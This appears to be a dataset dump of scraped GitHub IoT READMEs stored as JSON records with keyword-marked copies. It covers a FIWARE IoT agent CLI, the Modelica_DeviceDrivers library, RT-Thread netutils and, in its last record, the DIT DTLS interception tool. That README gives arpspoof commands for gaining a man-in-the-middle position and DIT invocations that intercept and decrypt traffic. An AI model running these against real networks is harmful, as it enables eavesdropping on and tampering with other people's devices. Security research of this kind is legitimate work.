needed to\nfill the template from a csv with two columns, device_id and device_name. the third parameter, type\nwill be used to replace the device_type field in the template. all the devices will be provisioned\nto the same iot agent, once the templates have been fulfilled.\nlistprovisioned\nlist all the provisioned devices in an iot agent.\nremoveprovisioned <deviceid>\nremove the selected provisioned device from the iot agent, specified by its device id.\naddgroup <filename>\nadd a new device group to the specified iot agent through the configuration api. the\nbody is taken from the file specified in the \"filename\" parameter.\nlistgroups\nlist all the device groups created in the selected iot agent for the configured service\nremovegroup <apikey> <resource>\nremove the device group corresponding to the current configured subservice.\nauthenticate <host> <port> <user> <password> <service>\nauthenticates to the given authentication server, and use the token in subsequent requests.\nsetprotocol <protocol>\nsets the protocol to use in the requests (http or https). defaults to http.\nconfigmigration <host> <port> <origindb>\nsets the configuration for a migration between a c++ iota and a node.js one.\nshowconfigmigration\nshows the current migration configuration.\naddprotocols <protocols>\nadd a protocol translation table, in the following format:\nprotocolorigin1=protocoltarget1;protocolorigin2=protocoltarget2...\nmigrate <targetdb> <service> <subservice>\nmigrate all the devices and services for the selected service and subservice into the\nspecified mongo database. to perform the migration for all the services or all the\nsubservices, use the \"*\" value.\nthe agent session stores transient configuration data about the target context broker and the target iot agent. this configuration is independent, and can be checked with the showconfigcb and showconfigiot commands, respectively. their values can be changed with the configcb and configiot commands respectively. the new configurations will be deleted upon startup.\ncreating specialized testers\nthe command-line testing tools make use of the command-node node.js library for command-line utils. in order to help creating testing tools for iotagents of specific protocols, all the commands of the library tester are offered as a array that can be directly imported into other command-line tools, using the following steps:\nrequire the iotagent-node-lib command-line module in your command-line -----> tool !!! :\nvar iotacommands = require(\"iotagent-node-lib\").commandline;\ninitialize the command-line utils (the initialization function takes two arguments, that will be explained in detail below:\niotacommands.init(configcb, configiot);\nadd the iota lib commands to your array of commands\ncommands = commands.concat(commands, iotacommands.commands);\nexecute the command-line interpreter as usual:\nclutils.initialize(commandline.commands, \"iot agent tester> \");\nthe command-line module makes use of two configuration objects. both can be shown and edited in the command-line using the provided commands, but a default value must be present.\nthe context broker configuration object holds all the information about the context broker where the iot agent to be tested is connected. it must contain the following attributes:\nhost: host where the context broker instance is located.\nport: port where the context broker instance is listening.\nservice: service that will be used in all the ngsi operations.\nsubservice: service that will be used in all the ngsi operations.\nthe iot agent configuration object holds information about the iot agent that is being tested. it must contain the following attributes:\nhost: host where the iot agent instance is located.\nport: port where the iot agent instance is listening.\nservice: service that will be used to group devices and device information.\nsubservice: subservice that will be used to group devices and device information.\nlicence\nthe iot agent node library is licensed under affero general public license (gpl) version 3.\n\u00a9 2019 telefonica investigaci\u00f3n y desarrollo, s.a.u\nare there any legal issues with agpl 3.0? is it safe for me to use?\nthere is absolutely no problem in using a product licensed under agpl 3.0. issues with gpl (or agpl) licenses are mostly related with the fact that different people assign different interpretations on the meaning of the term \u201cderivate work\u201d used in these licenses. due to this, some people believe that there is a risk in just using software under gpl or agpl licenses (even without modifying it).\nfor the avoidance of doubt, the owners of this software licensed under an agpl-3.0 license wish to make a clarifying public statement as follows:\nplease note that software derived as a result of modifying the source code of this software in order to fix a bug or incorporate enhancements is considered a derivative work of the product. software that merely uses or aggregates (i.e. links to) an otherwise unmodified version of existing software is not considered a derivative work, and therefore it does not need to be released as under the same license, or even released as open source.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000759, "year": null}, {"Unnamed: 0": 767, "autor": 767, "date": null, "content": "Modelica_DeviceDrivers\nThe master and the latest release has been updated to the Modelica Standard Library 4 (MSL 4, released 2020-06-04). Please use the Modelica_DeviceDrivers release v1.8.2 (last MSL 3 release) until your tool is updated for MSL 4.\nFree library for interfacing hardware drivers to Modelica models. There is support for joysticks, keyboards, UDP, TCP/IP, LCM, MQTT, shared memory, AD/DA converters, serial port and other devices.\nLibrary description\nThe Modelica_DeviceDrivers (MDD) library is an open source Modelica package that interfaces hardware drivers to Modelica models. An overview of the library is provided in\nBernhard Thiele, Thomas Beutlich, Volker Waurich, Martin Sj\u00f6lund, and Tobias Bellmann, Towards a Standard-Conform, Platform-Generic and Feature-Rich Modelica Device Drivers Library. In Ji\u0159\u00ed Kofr\u00e1nek and Francesco Casella, editors, 12th Int. Modelica Conference, Prague, Czech Republic, May 2017. Download\nThe library unifies previous developments concerning device driver support in Modelica, see Interactive Simulations and advanced Visualization with Modelica and Modelica for Embedded Systems (Modelica'2009 conference). The functionality covered by this library has been used internally at DLR for several years, such as for Driver-in-the-Loop simulation and for the DLR Robot Motion Simulator. The previously fragmented functionality was streamlined, improved, and extended to a coherent cross-platform library.\nMain features:\nCross-platform (Windows and Linux).\n(Soft) real-time synchronization of a simulation.\nSupport for keyboard, joystick/gamepad, and 3Dconnexion Spacemouse.\nSupport for a universal packaging concept to pack Modelica variables in a graphical and convenient way into a bit vector and transport such a bit vector via UDP, TCP/IP, LCM, MQTT, serial I/O or shared memory (CAN support is prototypical available).\nSupport of the Linux control and measurement device interface for digital and analog I/O (Comedi interface).\nAll device drivers are made available via external Modelica functions. Furthermore, high level interfaces on these functions are provided via Modelica blocks. The first interface uses Modelica 3.2 functionality only (when-clauses and sample-operator). The second interface uses the synchronous language elements introduced in Modelica 3.3 and is based on clocks.\nSelf-certification\nInternationalized\nUnit tests\nEnd-user documentation\nInternal documentation (documentation, interfaces, etc.)\nExisted and maintained for at least 6 months\nBuild status\nCurrent release\nDownload Modelica_DeviceDrivers latest release\nPlease note that the library is known to work with\nDymola,\nSimulationX (with userBufferSize all non-clocked communication blocks are working in SimulationX, but autoBufferSize only works for external solvers CVode and Fixed Step solver and fails for BDF and MEBDF solvers, see #54 (comment)),\nOpenModelica (partial support, e.g., UDP, serial port, shared memory, LCM, keyboard).\nIf you tested the library successfully with another Modelica tool, please contact Bernhard Thiele or send a pull request that updates this README.md.\nRelease notes\nBug fix releases may not have release notes, so please use the download link from above to get the latest release including bug fixes.\nVersion v2.0.0 (2020-06-08)\nMigrated from Modelica Standard Library 3 (MSL 3) to MSL 4 -> Non-backwards compatible release!\nHowever, apart from the MSL 4 dependency this release is compatible to previous releases and no update of user libraries is necessary apart from migrating to MSL 4.\nEnhancements:\nAdded all license files to better assist tool vendors in distribution of source or binary files (#313).\nUpdated 3rd-party library paho.mqtt.c to v1.3.4 (#320).\nBug fixes:\nFixed small issues in the SBHS Board example (#318).\nVersion v1.8.2 (2020-03-26)\nUpdated Linux MQTT binary dependencies. The updated libraries are compiled with the -fPIC flag, which fixes a related FMU generation problem (#306).\nVersion v1.8.1 (2020-02-26)\nFix declaration of MDD_spaceMouseGetData in external C code (#305).\nVersion v1.8.0 (2020-01-11)\nTCP/IP server communication (#296). In addition to the existing TCP/IP client blocks (see #78) there are now also blocks for setting up a TCP/IP server. See examples Blocks.Examples.TestSerialPackager_TCPIPServer and Blocks.Examples.TestSerialPackager_TCPIPServerMultipleClients.\nEnhanced real-time synchronization block (#290). Added an enhanced real-time synchronization block (Blocks.OperatingSystem.RealtimeSynchronize) and deprecated the existing block (Blocks.OperatingSystem.SynchronizeRealtime). The deprecated block is known to not working well with recent Dymola versions (e.g., Dymola 2020). The new RealtimeSynchronize block supports a sample-based real-time synchronization mode which is recommended for more deterministic, less solver sensitive behavior. See example Blocks.Examples.TestRealtimeSynchronize.\nAn utility block for debugging purposes which prints a message when triggered by an event (#289).\nUpdated 3rd-party library paho.mqtt.c to v1.3.1 (#293)\nBug fixes:\nFixed Spacemouse not working under Windows 10 bug (#289).\nMore similar behavior for getMACAddress() in Windows and Linux (#263).\nOther (minor) fixes and improvements.\nFor information about previous releases, see Release Notes of Previous Versions.\nCiting\nUse the following BibTeX lines to cite the Modelica_DeviceDrivers library\n@InProceedings{modelica2017mdd,\nTitle = {Towards a Standard-Conform, Platform-Generic and Feature-Rich Modelica Device Drivers Library},\nAuthor = {Thiele, Bernhard and Beutlich, Thomas and Waurich, Volker and Sj\u00f6lund, Martin and Bellmann, Tobias},\nBooktitle = {Proceedings of the 12th International Modelica Conference},\nYear = {2017},\nAddress = {Prague, Czech Republic},\nEditor = {Kofr\u00e1nek, Ji\u0159\u00ed and Casella, Francesco},\nMonth = may,\nPages = {713--723},\nDoi = {10.3384/ecp17132713},\n}\nLicense\nThis Modelica package is free software and the use is completely at your own risk; it can be redistributed and/or modified under the terms of the BSD-3-Clause License.\nDevelopment and contribution\nThe master branch of the Modelica_DeviceDrivers library should work out-of-the-box when loading the library into a supporting Modelica tool. The branch contains the necessary external C libraries as pre-build binaries below folder Modelica_DeviceDrivers/Resources/Library.\nIf you need to build the external C libraries from the sources, clone the repository with\ngit clone --recursive https://github.com/modelica/Modelica_DeviceDrivers.git\ngit submodule update --init --recursive\nand see Modelica_DeviceDrivers/Resources/README.md.\nMain developers:\nBernhard Thiele, release management, Linux specific code, etc.\nThomas Beutlich, SimulationX support, new features, Windows specific code, etc.\nTobias Bellmann, most of the initial MS Windows specific code.\nYou may report any issues with using the Issues button.\nContributions in shape of Pull Requests are always welcome.\nThe following people have directly contributed to the implementation of the library (many more have contributed by providing feedback and suggestions):\nMiguel Neves, human readable error codes for the Softing CAN interface.\nDominik Sommer, code for Linux serial port support.\nRangarajan Varadan, code for Windows serial port support.\nDietmar Winkler, GitHub project setup, development services integration etc.\nMartin Sj\u00f6lund, EmbeddedTargets.AVR support.\nLutz Berger, EmbeddedTargets.STM32F4 (experimental) support.\nAnd several more contributed bug fix PRs etc.", "link": "https://github.com/modelica-3rdparty/Modelica_DeviceDrivers", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "modelica_devicedrivers\nthe master and the latest release has been updated to the modelica standard library 4 (msl 4, released 2020-06-04). please use the modelica_devicedrivers release v1.8.2 (last msl 3 release) until your -----> tool !!!  is updated for msl 4.\nfree library for interfacing hardware drivers to modelica models. there is support for joysticks, keyboards, udp, tcp/ip, lcm, mqtt, shared memory, ad/da converters, serial port and other devices.\nlibrary description\nthe modelica_devicedrivers (mdd) library is an open source modelica package that interfaces hardware drivers to modelica models. an overview of the library is provided in\nbernhard thiele, thomas beutlich, volker waurich, martin sj\u00f6lund, and tobias bellmann, towards a standard-conform, platform-generic and feature-rich modelica device drivers library. in ji\u0159\u00ed kofr\u00e1nek and francesco casella, editors, 12th int. modelica conference, prague, czech republic, may 2017. download\nthe library unifies previous developments concerning device driver support in modelica, see interactive simulations and advanced visualization with modelica and modelica for embedded systems (modelica'2009 conference). the functionality covered by this library has been used internally at dlr for several years, such as for driver-in-the-loop simulation and for the dlr robot motion simulator. the previously fragmented functionality was streamlined, improved, and extended to a coherent cross-platform library.\nmain features:\ncross-platform (windows and linux).\n(soft) real-time synchronization of a simulation.\nsupport for keyboard, joystick/gamepad, and 3dconnexion spacemouse.\nsupport for a universal packaging concept to pack modelica variables in a graphical and convenient way into a bit vector and transport such a bit vector via udp, tcp/ip, lcm, mqtt, serial i/o or shared memory (can support is prototypical available).\nsupport of the linux control and measurement device interface for digital and analog i/o (comedi interface).\nall device drivers are made available via external modelica functions. furthermore, high level interfaces on these functions are provided via modelica blocks. the first interface uses modelica 3.2 functionality only (when-clauses and sample-operator). the second interface uses the synchronous language elements introduced in modelica 3.3 and is based on clocks.\nself-certification\ninternationalized\nunit tests\nend-user documentation\ninternal documentation (documentation, interfaces, etc.)\nexisted and maintained for at least 6 months\nbuild status\ncurrent release\ndownload modelica_devicedrivers latest release\nplease note that the library is known to work with\ndymola,\nsimulationx (with userbuffersize all non-clocked communication blocks are working in simulationx, but autobuffersize only works for external solvers cvode and fixed step solver and fails for bdf and mebdf solvers, see #54 (comment)),\nopenmodelica (partial support, e.g., udp, serial port, shared memory, lcm, keyboard).\nif you tested the library successfully with another modelica tool, please contact bernhard thiele or send a pull request that updates this readme.md.\nrelease notes\nbug fix releases may not have release notes, so please use the download link from above to get the latest release including bug fixes.\nversion v2.0.0 (2020-06-08)\nmigrated from modelica standard library 3 (msl 3) to msl 4 -> non-backwards compatible release!\nhowever, apart from the msl 4 dependency this release is compatible to previous releases and no update of user libraries is necessary apart from migrating to msl 4.\nenhancements:\nadded all license files to better assist tool vendors in distribution of source or binary files (#313).\nupdated 3rd-party library paho.mqtt.c to v1.3.4 (#320).\nbug fixes:\nfixed small issues in the sbhs board example (#318).\nversion v1.8.2 (2020-03-26)\nupdated linux mqtt binary dependencies. the updated libraries are compiled with the -fpic flag, which fixes a related fmu generation problem (#306).\nversion v1.8.1 (2020-02-26)\nfix declaration of mdd_spacemousegetdata in external c code (#305).\nversion v1.8.0 (2020-01-11)\ntcp/ip server communication (#296). in addition to the existing tcp/ip client blocks (see #78) there are now also blocks for setting up a tcp/ip server. see examples blocks.examples.testserialpackager_tcpipserver and blocks.examples.testserialpackager_tcpipservermultipleclients.\nenhanced real-time synchronization block (#290). added an enhanced real-time synchronization block (blocks.operatingsystem.realtimesynchronize) and deprecated the existing block (blocks.operatingsystem.synchronizerealtime). the deprecated block is known to not working well with recent dymola versions (e.g., dymola 2020). the new realtimesynchronize block supports a sample-based real-time synchronization mode which is recommended for more deterministic, less solver sensitive behavior. see example blocks.examples.testrealtimesynchronize.\nan utility block for debugging purposes which prints a message when triggered by an event (#289).\nupdated 3rd-party library paho.mqtt.c to v1.3.1 (#293)\nbug fixes:\nfixed spacemouse not working under windows 10 bug (#289).\nmore similar behavior for getmacaddress() in windows and linux (#263).\nother (minor) fixes and improvements.\nfor information about previous releases, see release notes of previous versions.\nciting\nuse the following bibtex lines to cite the modelica_devicedrivers library\n@inproceedings{modelica2017mdd,\ntitle = {towards a standard-conform, platform-generic and feature-rich modelica device drivers library},\nauthor = {thiele, bernhard and beutlich, thomas and waurich, volker and sj\u00f6lund, martin and bellmann, tobias},\nbooktitle = {proceedings of the 12th international modelica conference},\nyear = {2017},\naddress = {prague, czech republic},\neditor = {kofr\u00e1nek, ji\u0159\u00ed and casella, francesco},\nmonth = may,\npages = {713--723},\ndoi = {10.3384/ecp17132713},\n}\nlicense\nthis modelica package is free software and the use is completely at your own risk; it can be redistributed and/or modified under the terms of the bsd-3-clause license.\ndevelopment and contribution\nthe master branch of the modelica_devicedrivers library should work out-of-the-box when loading the library into a supporting modelica tool. the branch contains the necessary external c libraries as pre-build binaries below folder modelica_devicedrivers/resources/library.\nif you need to build the external c libraries from the sources, clone the repository with\ngit clone --recursive https://github.com/modelica/modelica_devicedrivers.git\ngit submodule update --init --recursive\nand see modelica_devicedrivers/resources/readme.md.\nmain developers:\nbernhard thiele, release management, linux specific code, etc.\nthomas beutlich, simulationx support, new features, windows specific code, etc.\ntobias bellmann, most of the initial ms windows specific code.\nyou may report any issues with using the issues button.\ncontributions in shape of pull requests are always welcome.\nthe following people have directly contributed to the implementation of the library (many more have contributed by providing feedback and suggestions):\nmiguel neves, human readable error codes for the softing can interface.\ndominik sommer, code for linux serial port support.\nrangarajan varadan, code for windows serial port support.\ndietmar winkler, github project setup, development services integration etc.\nmartin sj\u00f6lund, embeddedtargets.avr support.\nlutz berger, embeddedtargets.stm32f4 (experimental) support.\nand several more contributed bug fix prs etc.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000767, "year": null}, {"Unnamed: 0": 781, "autor": 781, "date": null, "content": "RT-Thread Network Gadgets Collection\nChinese | English\n1 Introduction\nWhen RT-Thread is connected to the network, the playability is greatly enhanced. Here is a collection of all the web widgets available for RT-Thread, and all the widgets you need can be found here.\n2. How to obtain\nPlease use ENV tool to assist download:\nThe path of the package is: RT-Thread online package -> IoT-internet of things -> netutils\n3. Instructions for use\nEach gadget can be enabled/disabled independently using menuconfig and provides commands for using Finsh/MSH. There is a detailed usage document in its catalog. If you need to use it, please check separately. The following is a summary of currently supported gadgets:\nName Classification Function Introduction Use Document\nPing Debugging test Use the \"ping\" command to check whether the network is connected, which can help us analyze and determine network failures click to view\nTFTP File transfer TFTP is a simple protocol for transferring files, which is lighter than FTP click to view\niperf Performance Test Test maximum TCP and UDP bandwidth performance, report bandwidth, delay jitter and packet loss Click to view\nNetIO Performance Test Tools for testing network throughput Click to view\nNTP Time synchronization Network time protocol, support 3 alternative servers Click to view\nTelnet Remote access Can remotely log in to RT-Thread's Finsh/MSH Shell Click to view\ntcpdump Network debugging tcpdump is RT-Thread's lwip-based network packet capture tool Click to view", "link": "https://github.com/RT-Thread-packages/netutils", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "rt-thread network gadgets collection\nchinese | english\n1 introduction\nwhen rt-thread is connected to the network, the playability is greatly enhanced. here is a collection of all the web widgets available for rt-thread, and all the widgets you need can be found here.\n2. how to obtain\nplease use env -----> tool !!!  to assist download:\nthe path of the package is: rt-thread online package -> iot-internet of things -> netutils\n3. instructions for use\neach gadget can be enabled/disabled independently using menuconfig and provides commands for using finsh/msh. there is a detailed usage document in its catalog. if you need to use it, please check separately. the following is a summary of currently supported gadgets:\nname classification function introduction use document\nping debugging test use the \"ping\" command to check whether the network is connected, which can help us analyze and determine network failures click to view\ntftp file transfer tftp is a simple protocol for transferring files, which is lighter than ftp click to view\niperf performance test test maximum tcp and udp bandwidth performance, report bandwidth, delay jitter and packet loss click to view\nnetio performance test tools for testing network throughput click to view\nntp time synchronization network time protocol, support 3 alternative servers click to view\ntelnet remote access can remotely log in to rt-thread's finsh/msh shell click to view\ntcpdump network debugging tcpdump is rt-thread's lwip-based network packet capture tool click to view", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000781, "year": null}, {"Unnamed: 0": 785, "autor": 785, "date": null, "content": "DIT - DTLS Interception Tool\nDIT is a MitM proxy tool to intercept DTLS traffic.\nIt can intercept, manipulate and/or suppress DTLS datagrams between two DTLS endpoints. To achieve this, the machine DIT is running on has to be put in a MitM position with tools like arpspoof. DIT has been built with Python 3.8, utilizes scapy and python-mbedtls to process datagrams and supports a wide variety of cipher suites. It can handle PSK-based and certificate-based (RSA + ECC) authentication schemes and has been built and tested on Debian-based Linux operating systems like Ubuntu or Kali Linux.\nDIT has been built to analyze traffic between IoT devices but can intercept any DTLS traffic in a local network. It has been tested and evaluated with OpenSSL and devices from the IKEA TR\u00c5DFRI and Philips Hue series. DIT can print the decrypted datagram payload to stdout or write it into a logfile. The tool can be configured via CLI arguments or via a configuration file (./config/dit_config.yaml).\n1. Installation\nDIT works with raw sockets and needs to run with root privileges. You can install DIT by simply cloning the repository and installing the dependencies listed in requirements.txt with elevated privileges.\ngit clone https://github.com/CountablyInfinite/dit\npip3 install -r requirements.txt\n2. Getting started\n2.1 Verifying the installation\nAfter cloning and installing the dependencies you can run the following command with elevated privileges to see if DIT has been installed successfully:\n./dit.py -h\n**************************\n* ___ ___ _____ *\n* | \\ |_ _| |_ _| *\n* | |) | | | | | *\n* |___/ |___| |_| *\n* *\n* DTLS INTERCEPTION TOOL *\n* *\n**************************\nusage: ./dit.py [optional arguments] start\ncheck configuration stored in ./config/dit_config.yaml before running DIT.\nedit the file or use optional command line arguments to override the default configuration.\nDIT needs root privileges and custom iptable rules to work properly.\nrun DIT:\nstart run DIT with the current settings (args override config file settings)\ntarget configuration:\n-isi , --iot_srv_ip iot server ip address (listening service) to be intercepted (config file: 192.168.183.129)\n-isp , --iot_srv_po iot server port to be intercepted. (config file: 1337)\n-ici , --iot_cli_ip iot client ip address to be intercepted. (config file: 192.168.183.128)\ninterface configuration:\n-eif , --ex_if_name external interface name (e.g. \"eth0\") to listen for incoming connections. (config file: ens33)\n-lif , --lh_if_name local interface name (e.g. \"lo\") to communicate with local services. (config file: lo)\npsk configuration:\n-cid , --cli_id client identity to configure server and client handler with. (config file: Client_identity)\n-psk , --pre_sh_key pre-shared key to configure server and client handler with. (config file: DIT_secret)\n--ciphers [ ...] list of ciphers to use, separated by spaces. (config file: None)\ncertificate configuration:\n-cer, --use_cert [FLAG] use certificates as a method of authentication (instead of a psk). (config file: False)\n-ks , --key_size length of the RSA/ECC key in bits. (config file: 2048)\n-ecc, --use_ecc [FLAG] use 521 bit ECC instead of RSA to generate a key pair. disables --key_size. (config file: False)\nlocal services configuration:\n-lci , --lh_cli_ip local ip address to start a client handler (DTLS server) on. (config file: 127.0.0.1)\n-lcp , --lh_cli_po local port to start a client handler (DTLS server listener) on. (config file: 1338)\n-lsi , --lh_srv_ip local ip address to connect a server handler (DTLS client) to. (config file: 127.0.0.1)\n-lsp , --lh_srv_po local port to connect a server handler (DTLS client) to. (config file: 1339)\nmiscellaneous:\n-ibl, --icmp_block [FLAG] automatically create an iptables rule to suppress icmp 'destination unreachable' messages\n-o , --output_file append intercepted unencrypted messages to an output file\n-v, --verbose [FLAG] increase verbosity to DEBUG level\n-h, --help [FLAG] show this help text and exit\nexamples:\n./dit.py -isi 192.168.0.1 -isp 1337 -ici 192.168.0.2 --ciphers TLS-PSK-WITH-AES-128-CCM-8 TLS-PSK-WITH-CHACHA20-POLY1305-SHA256 -psk DIT_secret start\n./dit.py --iot_srv_ip 192.168.0.1 --iot_cli_ip 192.168.0.2 --use_cert --key_size 3072 --ciphers TLS-RSA-WITH-AES-128-GCM-SHA256 --verbose start\n./dit.py -isi 192.168.0.1 -ici 192.168.0.2 --use_cert -ecc --output_file logfile.log --verbose start\nthis tool has been created for the purposes of academic research.\nuse responsibly and only when explicitly authorized.\n2.2 Prerequisite\n2.2.1 Elevated privileges\nDIT uses raw sockets and therefore needs to run with elevated (root) privileges.\n2.2.2 iptables rule\nDIT builds four proxy layers with scapy that are communicating between the external interface and the DTLS services running on localhost. To suppress upcoming \"Destination unreachable\" errors - that cause DIT to halt with an error - a custom iptables rule is necessary. You can generate it with the following command:\niptables -I OUTPUT -d localhost-ip -p icmp --icmp-type destination-unreachable -j DROP\nThe iptable rules can be set/unset automatically by using the --icmp_block argument when starting DIT.\n./dit.py --icmp_block start\n2.2.3 MitM position\nFor DIT to work it has to be run from a MitM position. A MitM position can be achieved in many ways, one of them is by using the tool arpspoof (part of the dsniff tool suite). To gain a MitM position in a local network between the clients 192.168.0.1 and 192.168.0.2 you can use the following command:\narpspoof -i ens33 -t 192.168.0.1 -r 192.168.0.2\n2.3 Configuring DIT\nDIT can be configured via CLI arguments or via a configuration file (./config/dit_config.yaml). CLI arguments override settings stored in the configuration file. When calling ./dit.py -h - as depicted in section 2.1 - DIT prints out the current configuration that has been read from the configuration file.\n2.3.1 ./config/dit_config.yaml\nDIT comes with a default configuration you'll need to adapt before running an attack.\ncat ./config/dit_config.yaml\n# configure spoofing/sniffing targets\ntargets:\niot_srv_ip: 192.168.183.129\niot_srv_po: 1337\niot_cli_ip: 192.168.183.128\nciphers:\n# if no ciphers are configured, DIT will offer all ciphersuites available with mbedTLS\n#- TLS-ECDHE-ECDSA-WITH-AES-256-CBC-SHA384\n#- TLS-PSK-WITH-AES-128-CCM-8\n#- TLS-RSA-WITH-AES-128-GCM-SHA256\n# configure interface names\ninterfaces:\nex_if_name: ens33\nlh_if_name: lo\n# configure psk options\npsk:\ncli_id: Client_identity\npre_sh_key: DIT_secret\n# configure certificate options\ncertificate:\n# default is RSA. \"use_ecc\" arg enables ECC and disables key_size\nuse_cert: False\nkey_size: 2048\nuse_ecc: False\n# configure local dtls services\nlocal_services:\nlh_cli_ip: 127.0.0.1\nlh_cli_po: 1338\nlh_srv_ip: 127.0.0.1\nlh_srv_po: 1339\ntargets:\niot_srv_ip: IP address of the dtls server\niot_srv_po: Port the dtls server is listening on\niot_cli_ip: IP address of the dtls client\nciphers: List of cipher suites (using the OpenSSL format) DIT will offer/support when establishing the connections. When no suites are configured DIT offers/supports all cipher suites available with mbedTLS.\ninterfaces:\nex_if_name: Name of the external interface DIT will operate on.\nlh_if_name: Name of the internal interface DIT will operate on. Local DTLS server and client services will operate on this interface.\npsk:\ncli_id: Client identy to be used when accepting / establishing DTLS connections. (Default key is 'Client_identity')\npr_sh_key: PSK to be used when accepting / establishing DTLS connections. (ASCII encoded)\ncertificate:\nuse_cert: Boolean value. Activates the usage of RSA certificates. DIT automatically creates and uses a corresponding certificate with \"key_size\" Bits in length.\nkey_size: Length of the RSA key in bits.\nuse_ecc: Boolean value. Activates the usege of ECC certificates. Only works when \"use_cert\" is set. Deactivates \"key_size\".\nlocal services:\nlh_cli_ip: IP address of the localhost interface the dtls client is running on. (typically 127.0.0.1)\nlh_cli_po: Port the local client instance is accepting traffic on. (needn't be changed in a typical setup)\nlh_srv_ip: IP address of the localhost interface the dtls server is running on. (typically 127.0.0.1)\nlh_srv_po: Port the local server instance is accepting traffic on. (needn't be changed in a typical setup)\n2.3.2 Command Line Arguments\nDIT can be configured via Command Line Arguments. The arguments are listed and described when calling ./dit.py -h - as shown in section 2.1. Command Line Arguments override settings stored in the configuration file and are a fast way to adapt/test settings without changing the config file.\n3. Use cases / Evaluation\nRefer to https://github.com/CountablyInfinite/dit/tree/master/doc", "link": "https://github.com/CountablyInfinite/dit", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "dit - dtls interception -----> tool !!! \ndit is a mitm proxy -----> tool !!!  to intercept dtls traffic.\nit can intercept, manipulate and/or suppress dtls datagrams between two dtls endpoints. to achieve this, the machine dit is running on has to be put in a mitm position with tools like arpspoof. dit has been built with python 3.8, utilizes scapy and python-mbedtls to process datagrams and supports a wide variety of cipher suites. it can handle psk-based and certificate-based (rsa + ecc) authentication schemes and has been built and tested on debian-based linux operating systems like ubuntu or kali linux.\ndit has been built to analyze traffic between iot devices but can intercept any dtls traffic in a local network. it has been tested and evaluated with openssl and devices from the ikea tr\u00e5dfri and philips hue series. dit can print the decrypted datagram payload to stdout or write it into a logfile. the tool can be configured via cli arguments or via a configuration file (./config/dit_config.yaml).\n1. installation\ndit works with raw sockets and needs to run with root privileges. you can install dit by simply cloning the repository and installing the dependencies listed in requirements.txt with elevated privileges.\ngit clone https://github.com/countablyinfinite/dit\npip3 install -r requirements.txt\n2. getting started\n2.1 verifying the installation\nafter cloning and installing the dependencies you can run the following command with elevated privileges to see if dit has been installed successfully:\n./dit.py -h\n**************************\n* ___ ___ _____ *\n* | \\ |_ _| |_ _| *\n* | |) | | | | | *\n* |___/ |___| |_| *\n* *\n* dtls interception tool *\n* *\n**************************\nusage: ./dit.py [optional arguments] start\ncheck configuration stored in ./config/dit_config.yaml before running dit.\nedit the file or use optional command line arguments to override the default configuration.\ndit needs root privileges and custom iptable rules to work properly.\nrun dit:\nstart run dit with the current settings (args override config file settings)\ntarget configuration:\n-isi , --iot_srv_ip iot server ip address (listening service) to be intercepted (config file: 192.168.183.129)\n-isp , --iot_srv_po iot server port to be intercepted. (config file: 1337)\n-ici , --iot_cli_ip iot client ip address to be intercepted. (config file: 192.168.183.128)\ninterface configuration:\n-eif , --ex_if_name external interface name (e.g. \"eth0\") to listen for incoming connections. (config file: ens33)\n-lif , --lh_if_name local interface name (e.g. \"lo\") to communicate with local services. (config file: lo)\npsk configuration:\n-cid , --cli_id client identity to configure server and client handler with. (config file: client_identity)\n-psk , --pre_sh_key pre-shared key to configure server and client handler with. (config file: dit_secret)\n--ciphers [ ...] list of ciphers to use, separated by spaces. (config file: none)\ncertificate configuration:\n-cer, --use_cert [flag] use certificates as a method of authentication (instead of a psk). (config file: false)\n-ks , --key_size length of the rsa/ecc key in bits. (config file: 2048)\n-ecc, --use_ecc [flag] use 521 bit ecc instead of rsa to generate a key pair. disables --key_size. (config file: false)\nlocal services configuration:\n-lci , --lh_cli_ip local ip address to start a client handler (dtls server) on. (config file: 127.0.0.1)\n-lcp , --lh_cli_po local port to start a client handler (dtls server listener) on. (config file: 1338)\n-lsi , --lh_srv_ip local ip address to connect a server handler (dtls client) to. (config file: 127.0.0.1)\n-lsp , --lh_srv_po local port to connect a server handler (dtls client) to. (config file: 1339)\nmiscellaneous:\n-ibl, --icmp_block [flag] automatically create an iptables rule to suppress icmp 'destination unreachable' messages\n-o , --output_file append intercepted unencrypted messages to an output file\n-v, --verbose [flag] increase verbosity to debug level\n-h, --help [flag] show this help text and exit\nexamples:\n./dit.py -isi 192.168.0.1 -isp 1337 -ici 192.168.0.2 --ciphers tls-psk-with-aes-128-ccm-8 tls-psk-with-chacha20-poly1305-sha256 -psk dit_secret start\n./dit.py --iot_srv_ip 192.168.0.1 --iot_cli_ip 192.168.0.2 --use_cert --key_size 3072 --ciphers tls-rsa-with-aes-128-gcm-sha256 --verbose start\n./dit.py -isi 192.168.0.1 -ici 192.168.0.2 --use_cert -ecc --output_file logfile.log --verbose start\nthis tool has been created for the purposes of academic research.\nuse responsibly and only when explicitly authorized.\n2.2 prerequisite\n2.2.1 elevated privileges\ndit uses raw sockets and therefore needs to run with elevated (root) privileges.\n2.2.2 iptables rule\ndit builds four proxy layers with scapy that are communicating between the external interface and the dtls services running on localhost. to suppress upcoming \"destination unreachable\" errors - that cause dit to halt with an error - a custom iptables rule is necessary. you can generate it with the following command:\niptables -i output -d localhost-ip -p icmp --icmp-type destination-unreachable -j drop\nthe iptable rules can be set/unset automatically by using the --icmp_block argument when starting dit.\n./dit.py --icmp_block start\n2.2.3 mitm position\nfor dit to work it has to be run from a mitm position. a mitm position can be achieved in many ways, one of them is by using the tool arpspoof (part of the dsniff tool suite). to gain a mitm position in a local network between the clients 192.168.0.1 and 192.168.0.2 you can use the following command:\narpspoof -i ens33 -t 192.168.0.1 -r 192.168.0.2\n2.3 configuring dit\ndit can be configured via cli arguments or via a configuration file (./config/dit_config.yaml). cli arguments override settings stored in the configuration file. when calling ./dit.py -h - as depicted in section 2.1 - dit prints out the current configuration that has been read from the configuration file.\n2.3.1 ./config/dit_config.yaml\ndit comes with a default configuration you'll need to adapt before running an attack.\ncat ./config/dit_config.yaml\n# configure spoofing/sniffing 